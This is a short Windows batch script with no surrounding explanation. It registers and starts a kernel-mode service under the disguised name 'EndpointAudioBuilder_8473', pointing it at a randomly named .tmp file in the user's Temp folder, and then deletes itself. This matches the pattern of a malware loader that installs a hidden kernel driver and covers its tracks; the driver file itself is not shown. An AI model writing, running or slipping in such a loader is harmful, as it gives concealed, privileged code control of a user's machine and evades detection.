@echo off
cd %~dp0
sc create EndpointAudioBuilder_8473 binpath=C:\Users\%username%\AppData\Local\Temp\c7e39b1d-75ae-5b32-819c-f34dcc27e529.tmp type=kernel
sc start EndpointAudioBuilder_8473
del "%~f0"



